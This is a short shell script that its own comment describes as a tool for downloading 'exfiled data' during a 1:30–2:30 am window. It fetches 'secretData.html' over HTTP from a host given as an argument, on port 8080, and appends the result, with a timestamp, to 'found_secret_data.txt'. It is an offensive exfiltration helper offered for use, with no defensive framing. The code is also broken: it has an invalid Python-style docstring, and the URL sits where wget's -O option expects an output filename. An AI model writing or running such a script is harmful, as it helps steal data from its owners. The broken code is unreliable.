"""
Use this to download the exfiled data
Download between 1:30 and 2:30 am
"""

data="found_secret_data.txt"
echo '\n' $(date) '\n' >> $data
wget -O http://$1:8080/secretData.html >> $data
